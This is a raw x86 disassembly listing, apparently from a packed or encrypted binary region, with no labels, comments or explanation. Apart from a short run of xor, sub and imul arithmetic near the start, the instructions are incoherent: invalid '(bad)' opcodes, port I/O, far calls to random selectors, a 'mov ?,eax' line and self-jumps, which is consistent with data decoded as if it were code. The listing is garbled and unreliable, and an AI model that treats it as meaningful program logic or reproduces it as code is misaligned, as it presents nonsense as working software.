  413e9d:	mov    al,ds:0xa7259cac
  413ea2:	addr16 pusha 
  413ea4:	mov    eax,ds:0x457a17ad
  413ea9:	jb     0x413e9c
  413eab:	add    BYTE PTR [ecx-0x31835a28],ch
  413eb1:	sub    eax,0x7677330a
  413eb6:	add    BYTE PTR [eax+0x2f],dl
  413eb9:	sti    
  413eba:	or     eax,ebx
  413ebc:	int3   
  413ebd:	push   ebx
  413ebe:	xor    eax,0xe2bde8de
  413ec3:	ror    cl,1
  413ec5:	call   0xafe5d9cc
  413eca:	enter  0xdf8e,0x37
  413ece:	icebp  
  413ecf:	xor    eax,0x337baf80
  413ed4:	ficomp WORD PTR ds:0x47095047
  413eda:	bound  esp,QWORD PTR [ebp+0x63]
  413edd:	stos   DWORD PTR es:[edi],eax
  413ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413edf:	xor    DWORD PTR [edi],edx
  413ee1:	(bad)  
  413ee2:	fld    TBYTE PTR [edi+0x558b4975]
  413ee8:	in     al,dx
  413ee9:	mov    DWORD PTR [ebp+0x8],edx
  413eec:	jmp    0x4162e7
  413ef1:	mov    edx,DWORD PTR [ebp+0x8]
  413ef4:	mov    ebx,DWORD PTR [ebp-0x8]
  413ef7:	xor    edx,eax
  413ef9:	xor    ebx,eax
  413efb:	sub    edx,ebx
  413efd:	sub    edx,esi
  413eff:	xor    edx,eax
  413f01:	mov    DWORD PTR [ebp+0x8],edx
  413f04:	mov    edx,DWORD PTR [ebp+0x8]
  413f07:	mov    ebx,DWORD PTR [ebp-0x58]
  413f0a:	add    edx,0x5708f8
  413f10:	imul   edx,ebx
  413f13:	jmp    0x416299
  413f18:	push   eax
  413f19:	pusha  
  413f1a:	clc    
  413f1b:	push   es
  413f1c:	call   0x5435b3a7
  413f21:	add    dh,bh
  413f23:	or     BYTE PTR [edx+edi*4],dh
  413f26:	sbb    al,0xe2
  413f28:	mov    ch,0x73
  413f2a:	jp     0x413fa6
  413f2c:	add    DWORD PTR [edi+0x7a],ebx
  413f2f:	jp     0x413eff
  413f31:	ret    
  413f32:	mov    dl,0xf
  413f34:	jnp    0x413f29
  413f36:	mov    ds:0x78df8f37,eax
  413f3b:	test   DWORD PTR [edi+0x34594c13],ebx
  413f41:	mov    ecx,0x39e058bf
  413f46:	in     al,dx
  413f47:	jecxz  0x413f29
  413f49:	and    ch,BYTE PTR [esi-0x7d]
  413f4c:	idiv   ah
  413f4e:	xchg   ecx,eax
  413f4f:	test   al,0xce
  413f51:	pop    ebx
  413f52:	sbb    ecx,DWORD PTR [ebx+0x18ef537f]
  413f58:	je     0x413f47
  413f5a:	fbld   TBYTE PTR [ecx+0x24c08d47]
  413f60:	aam    0x9d
  413f62:	dec    esp
  413f63:	dec    edi
  413f64:	sub    BYTE PTR [ecx-0x26],0x7e
  413f68:	mov    dl,0x2e
  413f6a:	inc    ebx
  413f6b:	stos   BYTE PTR es:[edi],al
  413f6c:	test   al,0xee
  413f6e:	dec    ebp
  413f6f:	in     eax,dx
  413f70:	and    DWORD PTR [edi+esi*1],esp
  413f73:	sti    
  413f74:	mov    eax,esi
  413f76:	mov    dl,0x4e
  413f78:	bound  edi,QWORD PTR [edx+edi*8+0x25e0eef7]
  413f7f:	mov    ss,WORD PTR [bx+di-0x41]
  413f83:	sbb    ebp,ecx
  413f85:	inc    eax
  413f86:	lahf   
  413f87:	shl    ah,0xdb
  413f8a:	cmp    al,0xac
  413f8c:	mov    edi,0x5958f855
  413f91:	mov    al,ds:0x2a9e1607
  413f96:	cmp    al,BYTE PTR [eax-0x484b8cef]
  413f9c:	xor    bh,BYTE PTR [edx]
  413f9e:	or     DWORD PTR [eax],esp
  413fa0:	repnz mov edx,0x279820cc
  413fa6:	jmp    0xc3139e8d
  413fab:	test   ebp,0xda251890
  413fb1:	test   eax,0xb8ed7bd4
  413fb6:	repz adc al,0xfd
  413fb9:	in     al,0x53
  413fbb:	stos   BYTE PTR es:[edi],al
  413fbc:	loope  0x414008
  413fbe:	mov    eax,0x2513df27
  413fc3:	mov    ebp,0xc1ea656a
  413fc8:	out    dx,eax
  413fc9:	mov    dl,0x27
  413fcb:	adc    al,0xa8
  413fcd:	xor    ebx,DWORD PTR [esi-0x5c3051ce]
  413fd3:	jecxz  0x413fe0
  413fd5:	jne    0x413fdf
  413fd7:	test   ebx,esp
  413fd9:	out    dx,al
  413fda:	xchg   ebp,eax
  413fdb:	mov    al,0x24
  413fdd:	repnz sbb BYTE PTR [edi-0x12],0xc6
  413fe2:	xchg   esi,eax
  413fe3:	inc    ecx
  413fe4:	pop    edx
  413fe5:	fisubr WORD PTR [ebx+0x5aefbe80]
  413feb:	in     al,0xb7
  413fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fee:	repz ret 
  413ff0:	push   esp
  413ff1:	aad    0x39
  413ff3:	in     al,0xa7
  413ff5:	dec    ecx
  413ff6:	add    BYTE PTR [edi+0x0],cl
  413ff9:	shl    DWORD PTR [esi-0x225a8ede],0x8d
  414000:	mov    ecx,0x32d092ad
  414005:	cmp    DWORD PTR [ebx-0x25c5d6f4],ecx
  41400b:	cmp    ecx,ebx
  41400d:	(bad)  
  41400e:	xlat   BYTE PTR ds:[ebx]
  41400f:	cld    
  414010:	dec    ebp
  414011:	sbb    DWORD PTR [eax+0xa],edx
  414014:	dec    BYTE PTR [esi-0x40]
  414017:	and    esp,DWORD PTR [esp+edi*2-0x16]
  41401b:	cmp    eax,0xf69d16f0
  414020:	mov    esi,0x8afae4c5
  414025:	stos   BYTE PTR es:[edi],al
  414026:	in     eax,0xc4
  414028:	and    esi,ecx
  41402a:	into   
  41402b:	inc    eax
  41402c:	mov    cl,0xe8
  41402e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414030:	push   esp
  414031:	push   esp
  414032:	fstp   DWORD PTR [ebp-0x49a57ce9]
  414038:	je     0x41401f
  41403a:	pop    ss
  41403b:	mov    BYTE PTR [ebx-0x24fb4ad0],al
  414041:	xchg   edi,eax
  414042:	cwde   
  414043:	pusha  
  414044:	mov    ebx,0x59ef367e
  414049:	add    al,BYTE PTR [esi+ebx*2-0x51]
  41404d:	push   esp
  41404e:	std    
  41404f:	dec    ecx
  414050:	leave  
  414051:	cld    
  414052:	test   ebx,edx
  414054:	jecxz  0x41401c
  414056:	imul   BYTE PTR [eax+eiz*4+0x25]
  41405a:	div    dl
  41405c:	adc    al,0xa1
  41405e:	or     esi,esp
  414060:	xchg   ebp,eax
  414061:	fdivr  DWORD PTR [ebp+0x65]
  414064:	pop    edi
  414065:	stos   DWORD PTR es:[edi],eax
  414066:	dec    edx
  414067:	adc    BYTE PTR [edi+0x69],dh
  41406a:	push   ds
  41406b:	out    dx,al
  41406c:	pop    ebp
  41406d:	xchg   ebx,eax
  41406e:	xchg   al,bh
  414070:	(bad)  
  414071:	xchg   ebx,eax
  414072:	xchg   edi,eax
  414073:	pop    edx
  414074:	fcmovne st,st(5)
  414076:	nop
  414077:	cdq    
  414078:	out    0x79,al
  41407a:	jne    0x4140f6
  41407c:	push   esp
  41407d:	and    edi,DWORD PTR [eax]
  41407f:	xlat   BYTE PTR ds:[ebx]
  414080:	jbe    0x4140d5
  414082:	add    al,0x92
  414084:	xor    DWORD PTR [edi],ebp
  414086:	std    
  414087:	cvtps2pi mm6,QWORD PTR [edx+edi*8-0x73]
  41408c:	adc    al,0x7
  41408e:	sahf   
  41408f:	sar    dl,cl
  414091:	jmp    0x4140a5
  414093:	leave  
  414094:	xor    bh,cl
  414096:	dec    edx
  414097:	xchg   ebx,eax
  414098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414099:	(bad)  
  41409a:	fsub   st,st(7)
  41409c:	dec    ebp
  41409d:	and    BYTE PTR [ecx],ch
  41409f:	iret   
  4140a0:	rol    BYTE PTR [edx-0x1e],1
  4140a3:	enter  0x4eb8,0x47
  4140a7:	shr    DWORD PTR [esp+ebx*8],cl
  4140aa:	cmp    dl,BYTE PTR [ebx-0x561d69c9]
  4140b0:	push   ds
  4140b1:	call   0x3618:0x281b46ab
  4140b8:	fiadd  DWORD PTR [edx+0x7e7dbc5e]
  4140be:	mov    edi,0x84f765f6
  4140c3:	cmp    al,0x31
  4140c5:	pop    esp
  4140c6:	cmp    bh,dl
  4140c8:	repnz mov ecx,0x69abbf37
  4140ce:	jae    0x414135
  4140d0:	sbb    eax,0xc06caa89
  4140d5:	sub    BYTE PTR [edi-0x80],cl
  4140d8:	hlt    
  4140d9:	imul   ecx,DWORD PTR [ecx],0x59
  4140dc:	rol    esp,1
  4140de:	test   eax,0x34b00f5a
  4140e3:	clc    
  4140e4:	gs adc al,0x1b
  4140e7:	jmp    0x414090
  4140e9:	sbb    ch,dh
  4140eb:	add    cl,bh
  4140ed:	pop    ds
  4140ee:	je     0x414162
  4140f0:	das    
  4140f1:	fistp  QWORD PTR [edx-0x7a638f61]
  4140f7:	je     0x414102
  4140f9:	fwait
  4140fa:	push   0x60
  4140fc:	call   0x4aab:0x3033ba81
  414103:	xor    BYTE PTR [ecx-0x43aea45e],dl
  414109:	outs   dx,BYTE PTR ds:[esi]
  41410a:	push   cs
  41410b:	les    eax,FWORD PTR [eax+ebx*4]
  41410e:	sbb    dl,bl
  414110:	mov    edi,0x11be83a4
  414115:	ins    BYTE PTR es:[edi],dx
  414116:	sub    BYTE PTR [edx-0x1b26bf71],bh
  41411c:	mov    dh,0x23
  41411e:	mov    ds:0xe759bd46,eax
  414123:	das    
  414124:	(bad)  
  414125:	ins    DWORD PTR es:[edi],dx
  414126:	or     eax,0x66691da1
  41412b:	rcl    DWORD PTR [ecx+0x1f],0x3d
  41412f:	lods   al,BYTE PTR ds:[esi]
  414130:	out    0x9d,al
  414132:	popa   
  414133:	shl    DWORD PTR [ecx+0x6c],0x70
  414137:	mov    edx,0x9f02e93d
  41413c:	stos   DWORD PTR es:[edi],eax
  41413d:	inc    edi
  41413e:	xchg   esp,eax
  41413f:	push   esi
  414140:	dec    esp
  414141:	add    al,BYTE PTR [ebx]
  414143:	sub    eax,0x44e2176d
  414148:	sbb    eax,0x8183c0b0
  41414d:	pop    esp
  41414e:	pop    es
  41414f:	sub    al,0x62
  414151:	rep lods eax,DWORD PTR ds:[esi]
  414153:	fwait
  414154:	shr    DWORD PTR [ecx-0xed42515],0x9d
  41415b:	dec    BYTE PTR [edi]
  41415d:	retf   0x7ce1
  414160:	push   eax
  414161:	scas   eax,DWORD PTR es:[edi]
  414162:	mov    ch,BYTE PTR [ebx+edx*2+0x3a]
  414166:	xchg   ebp,eax
  414167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414168:	test   eax,0x324d414d
  41416d:	mov    ebx,0x59c1b38a
  414172:	sahf   
  414173:	sub    al,0x4d
  414175:	pop    esp
  414176:	or     DWORD PTR [edx+0x4f],ebp
  414179:	mov    dl,0xba
  41417b:	fst    QWORD PTR [eax]
  41417d:	std    
  41417e:	sbb    ebx,edx
  414180:	lods   al,BYTE PTR ds:[esi]
  414181:	push   ebp
  414182:	out    dx,eax
  414183:	jns    0x4141c4
  414185:	mov    ecx,0x3f22b06
  41418a:	imul   ebp,DWORD PTR [ebx-0x63],0xb792cfcd
  414191:	adc    edx,DWORD PTR [esi+0x91fde69]
  414197:	(bad)  
  414198:	ret    
  414199:	xchg   esp,eax
  41419a:	dec    ebp
  41419b:	sub    al,0x5d
  41419d:	mov    esp,0x14c79cd6
  4141a2:	fisub  WORD PTR [eax-0x4de1b38a]
  4141a8:	std    
  4141a9:	retf   
  4141aa:	or     bl,al
  4141ac:	iret   
  4141ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ae:	mov    ebx,0x46744bef
  4141b3:	sub    DWORD PTR [ebp-0x4ca92d64],ebx
  4141b9:	push   0x5e
  4141bb:	fstp   TBYTE PTR [ebp+0x1ba7a260]
  4141c1:	mov    ch,0xd4
  4141c3:	bound  esp,QWORD PTR [edi]
  4141c5:	arpl   WORD PTR ds:0xefda1606,si
  4141cb:	js     0x41418a
  4141cd:	call   0x5d93fcee
  4141d2:	inc    edx
  4141d3:	xchg   ebp,eax
  4141d4:	inc    esp
  4141d5:	std    
  4141d6:	and    DWORD PTR [esi],0x86e72ca9
  4141dc:	lods   eax,DWORD PTR ds:[esi]
  4141dd:	cwde   
  4141de:	mov    bl,0x88
  4141e0:	or     DWORD PTR [ebx-0x5],edx
  4141e3:	xor    edi,DWORD PTR [edi-0x5d]
  4141e6:	out    dx,eax
  4141e7:	jge    0x414171
  4141e9:	retf   
  4141ea:	lods   al,BYTE PTR ds:[esi]
  4141eb:	mov    DWORD PTR [edx-0x664361ae],esi
  4141f1:	js     0x4141a7
  4141f3:	ret    
  4141f4:	xchg   esi,eax
  4141f5:	jnp    0x4141d3
  4141f7:	pop    ds
  4141f8:	mov    eax,0x442c7bb8
  4141fd:	ss test eax,0x404f18fe
  414203:	int    0x67
  414205:	push   eax
  414206:	test   DWORD PTR [eax],0xab2dd4ab
  41420c:	dec    edx
  41420d:	(bad)  
  41420e:	push   esi
  41420f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414210:	and    DWORD PTR [edi-0x269fce95],0x7b387c2b
  41421a:	sbb    al,0x8a
  41421c:	addr16 call 0x6e2af0c0
  414222:	mov    edi,0x8b2a1927
  414227:	pop    ebx
  414228:	ret    0x72e6
  41422b:	(bad)  
  41422c:	mov    esi,0xf148ade7
  414231:	scas   eax,DWORD PTR es:[edi]
  414232:	imul   eax,DWORD PTR [ecx],0xffffffce
  414235:	pushf  
  414236:	sbb    dl,bl
  414238:	imul   ebx,edi,0x5eeae9f7
  41423e:	mov    ebx,0xa6a6c49d
  414243:	sbb    al,0x6d
  414245:	cmp    eax,0xea4b47eb
  41424a:	fwait
  41424b:	stos   DWORD PTR es:[edi],eax
  41424c:	(bad)  
  41424d:	popa   
  41424e:	mov    bh,0x12
  414250:	ins    DWORD PTR es:[edi],dx
  414251:	cld    
  414252:	fidiv  DWORD PTR [ebx-0x3e513fdb]
  414258:	fidiv  DWORD PTR [ebp+ebx*2+0x6f]
  41425c:	jp     0x41429c
  41425e:	popa   
  41425f:	mov    ebp,0x7dd293eb
  414264:	imul   esp,eax,0xfffffff3
  414267:	xchg   esi,eax
  414268:	sub    al,0xcd
  41426a:	mov    DWORD PTR [edx],ebp
  41426c:	ror    BYTE PTR [edi],0x9
  41426f:	jp     0x4142e5
  414271:	ds and cl,cl
  414274:	inc    edx
  414275:	(bad)
  414278:	or     bh,BYTE PTR [ebp+0x3f]
  41427b:	jno    0x4142d5
  41427d:	xchg   esp,eax
  41427e:	lea    ecx,[eax-0x62e16bee]
  414284:	dec    esp
  414285:	out    dx,al
  414286:	mov    ebp,0x744842ae
  41428b:	shl    DWORD PTR [edi+0x65722c66],cl
  414291:	jle    0x4142e2
  414293:	xchg   DWORD PTR [ebx-0x50],esp
  414296:	(bad)  [eax-0x313d31e6]
  41429c:	and    dh,ah
  41429e:	add    eax,0x1e8c8ad6
  4142a3:	pop    ss
  4142a4:	(bad)  
  4142a5:	pop    ebx
  4142a6:	mov    ecx,0xc01d24b7
  4142ab:	shl    BYTE PTR [ebp+0x3d],cl
  4142ae:	push   cs
  4142af:	stc    
  4142b0:	clc    
  4142b1:	xor    BYTE PTR ds:0x74c02bcd,cl
  4142b7:	pop    esi
  4142b8:	out    dx,eax
  4142b9:	jecxz  0x41430a
  4142bb:	inc    edi
  4142bc:	ss pop ds
  4142be:	jmp    0x908a46c6
  4142c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142c4:	mov    cs,WORD PTR [edi-0x24c84bac]
  4142ca:	xchg   BYTE PTR [edx-0x78],bl
  4142cd:	sbb    al,0x4f
  4142cf:	fiadd  WORD PTR [ebp-0x29ea38ea]
  4142d5:	jbe    0x4142b6
  4142d7:	pop    ds
  4142d8:	shl    ah,0x55
  4142db:	jge    0x41427d
  4142dd:	scas   eax,DWORD PTR es:[edi]
  4142de:	pop    edx
  4142df:	fld    DWORD PTR [ecx-0xf]
  4142e2:	mov    esp,0xd402c1
  4142e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e8:	test   BYTE PTR [ecx+ebx*2],ch
  4142eb:	imul   ebp,esi,0xacfb8680
  4142f1:	stos   BYTE PTR es:[edi],al
  4142f2:	xchg   bh,dh
  4142f4:	adc    BYTE PTR ds:0x337a05d0,ch
  4142fa:	repnz pop ecx
  4142fc:	inc    eax
  4142fd:	or     eax,0x8ac1094f
  414302:	enter  0xf281,0x22
  414306:	in     eax,dx
  414307:	add    bh,BYTE PTR [edi]
  414309:	mov    ecx,0x41622758
  41430e:	ds add ecx,esi
  414311:	repnz cs add eax,0x53f15fc3
  414318:	nop
  414319:	or     al,0x5a
  41431b:	push   esp
  41431c:	mov    ecx,esi
  41431e:	outs   dx,DWORD PTR ds:[esi]
  41431f:	jmp    0x5354:0x8e66aeac
  414326:	gs push edx
  414328:	stos   DWORD PTR es:[edi],eax
  414329:	inc    ecx
  41432a:	pop    eax
  41432b:	in     al,0x84
  41432d:	jle    0x41439e
  41432f:	retf   
  414330:	aad    0x2f
  414332:	sub    ebx,ebp
  414334:	dec    eax
  414335:	jo     0x414369
  414337:	rcr    DWORD PTR [esi-0x56],1
  41433a:	fimul  WORD PTR [ecx]
  41433c:	es push 0x903b0e0
  414342:	mov    dh,0x9e
  414344:	fs fs xchg edi,eax
  414347:	rcl    DWORD PTR [edi],0x62
  41434a:	int    0x1d
  41434c:	adc    al,0x10
  41434e:	cwde   
  41434f:	mov    dl,0xc5
  414351:	lock push ecx
  414353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414354:	push   edi
  414355:	and    ch,BYTE PTR [edx+eiz*4-0x7b]
  414359:	out    0xbd,eax
  41435b:	retf   
  41435c:	(bad)  
  41435e:	mov    eax,ds:0xb45128d2
  414363:	pushf  
  414364:	bnd ja 0x414345
  414367:	dec    eax
  414368:	outs   dx,BYTE PTR ds:[esi]
  414369:	call   0x5c45:0x46b6dc0a
  414370:	int3   
  414371:	mul    DWORD PTR [edx-0x626974db]
  414377:	shl    edi,cl
  414379:	sahf   
  41437a:	adc    al,0x4d
  41437c:	mov    bh,0xe9
  41437e:	cmp    ah,0xb7
  414381:	popf   
  414382:	jmp    0x529f2101
  414387:	mov    ?,eax
  414389:	sahf   
  41438a:	sti    
  41438b:	mov    dh,BYTE PTR [eax+0x71]
  41438e:	xor    al,0xe9
  414390:	imul   edx,DWORD PTR [ebp-0x3],0x4b
  414394:	sub    DWORD PTR [ecx+0x66],eax
  414397:	xchg   edx,eax
  414398:	push   ebx
  414399:	ins    BYTE PTR es:[edi],dx
  41439a:	xchg   esp,eax
  41439b:	cmp    edx,eax
  41439d:	daa    
  41439e:	imul   edi,DWORD PTR [ebp-0x6d],0xffffffeb
  4143a2:	pop    ecx
  4143a3:	xchg   ecx,eax
  4143a4:	jno    0x41439f
  4143a6:	jbe    0x41435e
  4143a8:	enter  0x976b,0xf7
  4143ac:	and    BYTE PTR [ebx],ch
  4143ae:	sub    BYTE PTR [edx],cl
  4143b0:	mov    bh,BYTE PTR [ebx-0x25714886]
  4143b6:	sub    DWORD PTR [ecx+0x3c2242],edx
  4143bc:	sbb    eax,0xcca11d4c
  4143c1:	in     eax,dx
  4143c2:	sub    ecx,DWORD PTR [edi+0x7a]
  4143c5:	out    0x30,al
  4143c7:	pop    eax
  4143c8:	es xchg esp,eax
  4143ca:	test   BYTE PTR [edx-0xd],0x23
  4143ce:	push   esp
  4143cf:	xchg   esi,eax
  4143d0:	mov    es,esi
  4143d2:	mov    dh,al
  4143d4:	lahf   
  4143d5:	fs aaa 
  4143d7:	mov    fs,WORD PTR [eax]
  4143d9:	adc    ebx,0xffffffae
  4143dc:	in     al,dx
  4143dd:	fwait
  4143de:	dec    ebp
  4143df:	mov    es,WORD PTR [edx+0x6d0350d3]
  4143e5:	inc    ecx
  4143e6:	xor    DWORD PTR [ecx-0x3c69871c],eax
  4143ec:	jns    0x414452
  4143ee:	xchg   ebp,eax
  4143ef:	aam    0x5f
  4143f1:	pop    edx
  4143f2:	stos   DWORD PTR es:[edi],eax
  4143f3:	jg     0x41443b
  4143f5:	jg     0x4143ed
  4143f7:	add    BYTE PTR [edx+eax*8],dl
  4143fa:	and    eax,0xf158216d
  4143ff:	mov    cl,0x45
  414401:	jl     0x4143c8
  414403:	add    DWORD PTR ds:0xe3e2716a,ebx
  414409:	scas   al,BYTE PTR es:[edi]
  41440a:	fdiv   QWORD PTR [ecx+edi*1+0x9]
  41440e:	mov    esi,0xb00d38b6
  414413:	jmp    0x17742f9e
  414418:	or     al,0xfc
  41441a:	je     0x4143be
  41441c:	sbb    eax,0x100085e5
  414421:	cli    
  414422:	inc    eax
  414423:	out    0x2f,eax
  414425:	(bad)  
  414426:	mov    ah,0xa0
  414428:	pop    esi
  414429:	out    dx,eax
  41442a:	pop    ecx
  41442b:	into   
  41442c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41442d:	enter  0x48b,0xf0
  414431:	sub    al,0x4
  414433:	and    al,0x5f
  414435:	neg    DWORD PTR [eax+0x3e]
  414438:	mov    ch,0x7a
  41443a:	jl     0x414400
  41443c:	xchg   edi,eax
  41443d:	in     eax,0x2a
  41443f:	jo     0x41443a
  414441:	inc    ebx
  414442:	fwait
  414443:	js     0x4143ef
  414445:	push   es
  414446:	scas   eax,DWORD PTR es:[edi]
  414447:	rol    DWORD PTR [esi+0x3],1
  41444a:	or     al,0x41
  41444c:	aaa    
  41444d:	jns    0x41443a
  41444f:	add    al,0xc
  414451:	cmc    
  414452:	out    dx,al
  414453:	sbb    ebp,ebx
  414455:	cmp    dh,BYTE PTR [esi-0x758dead7]
  41445b:	xor    ah,cl
  41445d:	mov    cl,BYTE PTR [edi+0x38]
  414460:	and    edx,ebx
  414462:	mov    DWORD PTR [ecx],esp
  414464:	scas   al,BYTE PTR es:[edi]
  414465:	lea    eax,[ebx+0x4d721e23]
  41446b:	cdq    
  41446c:	bound  ecx,QWORD PTR [ebx+0x28]
  41446f:	and    BYTE PTR [esi-0x3e],bl
  414472:	adc    dh,BYTE PTR [esi+0x3b]
  414475:	xor    eax,0xe5d37d1d
  41447a:	mov    eax,0xcfc4ac2f
  41447f:	popa   
  414480:	adc    al,0x4b
  414482:	jne    0x414424
  414484:	xor    DWORD PTR [edi-0x13bf4a42],ecx
  41448a:	cwde   
  41448b:	pop    edi
  41448c:	lahf   
  41448d:	sbb    DWORD PTR [eax-0x2f],ecx
  414490:	xor    DWORD PTR [edi],eax
  414492:	cli    
  414493:	cs lock mov cl,0xf6
  414497:	loope  0x4144cf
  414499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41449a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41449c:	and    DWORD PTR [esi],esi
  41449e:	sub    ebx,DWORD PTR [eax+ebx*4]
  4144a1:	mov    edi,DWORD PTR [ebx-0x683e8a91]
  4144a7:	push   ds
  4144a8:	stos   BYTE PTR es:[edi],al
  4144a9:	mov    al,ah
  4144ab:	mov    ah,0xd6
  4144ad:	imul   esp,esi,0x4a
  4144b0:	call   0xe2b12fe1
  4144b5:	mov    dl,0x37
  4144b7:	(bad)  
  4144b8:	(bad)  
  4144b9:	jmp    0x4144b9
  4144bb:	xchg   esi,eax
  4144bc:	jp     0x41446a
  4144be:	lods   al,BYTE PTR ds:[esi]
  4144bf:	or     BYTE PTR [ebx+0x75],0x44
  4144c3:	inc    DWORD PTR [esi]
  4144c5:	push   ds
  4144c6:	out    dx,eax
  4144c7:	jecxz  0x4144a2
  4144c9:	push   ebx
  4144ca:	push   ds
  4144cb:	pop    ebp
  4144cc:	adc    BYTE PTR [ecx+0x75],cl
  4144cf:	sub    eax,0xf36278f5
  4144d4:	int    0x4
  4144d6:	cmp    DWORD PTR [edi],ecx
  4144d8:	adc    eax,0xf4789068
  4144dd:	pushf  
  4144de:	pop    eax
  4144df:	or     BYTE PTR ds:0xefcfee17,0x8a
  4144e6:	bound  eax,QWORD PTR [ebx]
  4144e8:	test   al,bl
  4144ea:	pop    ebx
  4144eb:	fucomip st,st(3)
  4144ed:	retf   0x6aa4
  4144f0:	mov    ah,0x3e
  4144f2:	sbb    DWORD PTR [ebx+0x3dc78367],eax
  4144f8:	lahf   
  4144f9:	pusha  
  4144fa:	fisttp WORD PTR [ebp+0x66624dde]
  414500:	sbb    eax,DWORD PTR [esi+0x48]
  414503:	jno    0x414566
  414505:	test   ecx,eax
  414507:	in     eax,dx
  414508:	and    DWORD PTR [ebp+0x2296112c],ebp
  41450e:	ret    0x8670
  414511:	fisub  WORD PTR [esi+0x27]
  414514:	adc    al,0x28
  414516:	ret    0x911e
  414519:	mov    ds:0xb46c7da4,eax
  41451e:	mov    ds:0x79a3335a,al
  414523:	mov    esi,0x6957b286
  414528:	aas    
  414529:	jmp    0x92b3:0xb4dc4c43
  414530:	std    
  414531:	push   eax
  414532:	jge    0x41456a
  414534:	jns    0x41450e
  414536:	ins    DWORD PTR es:[edi],dx
  414537:	mov    edx,0xe25d0a36
  41453c:	ror    BYTE PTR [esi+0x429fa367],0x5c
  414543:	lea    ebp,[eax+0x31434cb6]
  414549:	out    dx,al
  41454a:	xchg   ebp,eax
  41454b:	call   0x11db:0xc98e6162
  414552:	lds    esp,FWORD PTR [eax-0x6e8a4f73]
  414558:	ja     0x414563
  41455a:	test   DWORD PTR [edi],esi
  41455c:	jbe    0x41458a
  41455e:	mov    ch,al
  414560:	clc    
  414561:	outs   dx,BYTE PTR ds:[esi]
  414562:	add    ch,bh
  414564:	ss sar esp,1
  414567:	or     ebx,DWORD PTR [eax+0x26]
  41456a:	lahf   
  41456b:	shl    DWORD PTR [ebx-0x55],cl
  41456e:	call   0x1ad6:0x1f62d38f
  414575:	mov    BYTE PTR [ebp-0x1f],dl
  414578:	adc    BYTE PTR [ebx-0x6f],al
  41457b:	mov    bl,0xec
  41457d:	test   al,0xde
  41457f:	fisttp WORD PTR [edi-0xcd309df]
  414585:	push   ecx
  414586:	pop    esp
  414587:	jnp    0x41451e
  414589:	xlat   BYTE PTR ds:[ebx]
  41458a:	push   esi
  41458b:	push   eax
  41458c:	imul   ebp,DWORD PTR [ebx+0x12a2e7fe],0xffffffa5
  414593:	ret    0x8fd
  414596:	fstp   QWORD PTR [edi]
  414598:	xchg   DWORD PTR [ecx+0x44],esp
  41459b:	push   0x17
  41459d:	retf   
  41459e:	(bad)  
  41459f:	dec    edi
  4145a0:	adc    DWORD PTR [ebp+0x429dabae],edx
  4145a6:	push   es
  4145a7:	sti    
  4145a8:	add    BYTE PTR [edx-0x35],0xdf
  4145ac:	test   al,0xd7
  4145ae:	out    dx,al
  4145af:	xor    eax,0xc64a456
  4145b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b5:	jg     0x41461f
  4145b7:	fsubrp st(3),st
  4145b9:	(bad)  
  4145ba:	sub    DWORD PTR [esi+eax*4-0x646703e7],edx
  4145c1:	ror    DWORD PTR [ebp-0x3b],cl
  4145c4:	and    DWORD PTR [ebx],0x23386b88
  4145ca:	(bad)  
  4145cb:	jmp    0xcae2cf0f
  4145d0:	xchg   edi,eax
  4145d1:	call   0xb5e46366
  4145d6:	add    ah,BYTE PTR [edi+ecx*1-0x43]
  4145da:	sahf   
  4145db:	test   eax,0x84939843
  4145e0:	stos   DWORD PTR es:[edi],eax
  4145e1:	xchg   edx,eax
  4145e2:	test   eax,0x263cb1b
  4145e7:	adc    cl,BYTE PTR [ebp+esi*4+0x3]
  4145eb:	xlat   BYTE PTR ds:[ebx]
  4145ec:	mov    al,0x20
  4145ee:	out    0x41,eax
  4145f0:	in     al,dx
  4145f1:	in     eax,dx
  4145f2:	cld    
  4145f3:	add    eax,0xb029f5d
  4145f8:	xchg   ah,ah
  4145fa:	inc    esi
  4145fb:	push   edx
  4145fc:	dec    edi
  4145fd:	jmp    0xa824:0x5977c660
  414604:	adc    al,0xde
  414606:	mov    esp,0x252dfe59
  41460b:	pop    ss
  41460c:	adc    al,0xf
  41460e:	push   ecx
  41460f:	and    BYTE PTR [edi+0x483d67a1],0xc4
  414616:	pop    ss
  414617:	push   ebx
  414618:	add    bh,BYTE PTR [edi]
  41461a:	daa    
  41461b:	les    esp,FWORD PTR [ebx]
  41461d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41461e:	push   ds
  41461f:	pop    esi
  414620:	loop   0x4145a8
  414622:	outs   dx,BYTE PTR ds:[esi]
  414623:	jmp    0x4145df
  414625:	and    eax,0xb11977bd
  41462a:	sbb    dh,bh
  41462c:	xor    eax,0x814cf588
  414631:	mov    bl,0x56
  414633:	dec    esi
  414634:	lods   eax,DWORD PTR ss:[esi]
  414636:	add    al,0x42
  414638:	xchg   ebp,edi
  41463a:	adc    BYTE PTR [ebx],bl
  41463c:	sub    BYTE PTR ds:0x71430beb,0xf7
  414643:	jmp    0x414664
  414645:	cs push es
  414647:	ret    0xa982
  41464a:	rol    DWORD PTR [ecx-0x2a747905],1
  414650:	push   edx
  414651:	into   
  414652:	cmpps  xmm2,XMMWORD PTR [esi],0x3a
  414656:	xchg   edx,eax
  414657:	mov    esi,0x9f317c8f
  41465c:	jne    0x414639
  41465e:	shl    BYTE PTR [eax+0x4b],cl
  414661:	lds    esi,FWORD PTR [edi-0x102ba331]
  414667:	repnz stc 
  414669:	ins    BYTE PTR es:[edi],dx
  41466a:	pop    ecx
  41466b:	stos   DWORD PTR es:[edi],eax
  41466c:	rcr    BYTE PTR [edi-0x16],cl
  41466f:	in     eax,dx
